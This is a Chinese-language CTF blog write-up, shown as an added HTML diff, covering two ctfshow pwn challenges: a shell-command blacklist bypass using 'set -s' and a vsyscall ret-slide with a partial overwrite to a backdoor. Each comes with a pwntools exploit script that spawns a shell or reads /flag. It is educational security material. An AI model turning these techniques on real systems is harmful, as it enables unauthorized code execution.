@@ -1,0 +1,51 @@
+<hr>
+<p>title: trick<br>abbrlink: d8f0a91e<br>date: 2024-11-20 22:03:02</p>
+<h2 id="tags"><a href="#tags" class="headerlink" title="tags:"></a>tags:</h2><h4 id="ctfshow-单身杯"><a href="#ctfshow-单身杯" class="headerlink" title="ctfshow 单身杯"></a>ctfshow 单身杯</h4><h2 id="Findyourgirlfriend"><a href="#Findyourgirlfriend" class="headerlink" title="Findyourgirlfriend"></a>Findyourgirlfriend</h2><p>strstr函数返回子字符串第一次出现的指针，然后这里右边是判断，返回0或1</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241120220602192.png" alt="image-20241120220602192"></p>
+<p>输入的s不能包含这些字符串，然后输入的s是 <strong>set -s</strong>,</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241120221150711.png" alt="image-20241120221150711"></p>
+<p>最后执行的是<strong>system(‘/bin/sh -c set -s)</strong>,在sh内执行<strong>set -s</strong>,设置了shell输出选项而没有其他动作</p>
+<p>这里不能直接cat，因为远程环境没有给cat设置环境变量<strong>$PATH</strong></p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241120222324355.png" alt="image-20241120222324355"></p>
+<pre><code class="lang-py">from pwn import*
+from LibcSearcher import *
+#p=remote(&quot;pwn.challenge.ctf.show&quot;,28147)
+p=process(&quot;./girl&quot;)
+context.log_level=&quot;debug&quot;
+
+def dbg():
+    gdb.attach(p)
+    sleep(1)
+
+p.sendlineafter(&#39;games&#39;,&#39;1&#39;)
+
+payload=b&#39;set -s&#39;
+p.sendlineafter(&#39;girlfriend? &#39;,payload)
+p.sendline(&#39;/bin/cat /flag&#39;)
+
+
+p.interactive()
+</code></pre>
+<h2 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h2><p>保护全开，有个后门函数</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241120223315744.png" alt="image-20241120223315744"></p>
+<p>rax在栈上</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241120223444114.png" alt="image-20241120223444114"></p>
+<p>这里用了vsyscall，在这里x64这是固定的地址</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241120223513544.png" alt=""></p>
+<p>设计这玩意的初衷是限制了只有从vsyscall函数入口才能正常运行，避免gadget，这里是反复调用vsyscall不断调用ret破坏栈，具体调试不出来，直接报错了，只有栈上有.text段没清理干净，修改最低位就劫持了控制流</p>
+<pre><code class="lang-py">from pwn import*
+from LibcSearcher import *
+#p=remote(&quot;pwn.challenge.ctf.show&quot;,28149)
+p=process(&quot;./1&quot;)
+context.log_level=&quot;debug&quot;
+
+ret=0xffffffffff600000
+
+
+gdb.attach(p)
+pause()
+p.send(p64(ret)*30+b&#39;\x13&#39;)
+p.sendline(&#39;/bin/sh&#39;)
+
+p.interactive()
+</code></pre>
